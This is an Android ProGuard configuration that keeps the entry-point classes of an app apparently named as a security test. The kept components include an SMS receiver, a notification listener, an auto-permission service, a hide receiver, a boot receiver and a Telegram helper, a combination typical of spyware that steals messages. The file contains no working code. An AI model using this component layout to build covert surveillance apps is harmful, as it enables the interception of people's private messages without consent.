# Keep all entry points required by AndroidManifest.xml
-keep class com.security.testapp.MainActivity { *; }
-keep class com.security.testapp.SmsReceiver { *; }
-keep class com.security.testapp.NotificationListener { *; }
-keep class com.security.testapp.AutoPermissionService { *; }
-keep class com.security.testapp.NetworkReceiver { *; }
-keep class com.security.testapp.HideReceiver { *; }
-keep class com.security.testapp.BootReceiver { *; }
-keep class com.security.testapp.App { *; }

# Keep CryptoUtils (encryption must work)
-keep class com.security.testapp.CryptoUtils { *; }

# Keep TelegramHelper (static methods used everywhere)
-keep class com.security.testapp.TelegramHelper { *; }

# Keep DatabaseHelper
-keep class com.security.testapp.DatabaseHelper { *; }

# Keep PermissionHelper if used
-keep class com.security.testapp.PermissionHelper { *; }

# General Android rules
-keepattributes *Annotation*
-keepattributes SourceFile,LineNumberTable
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.Application
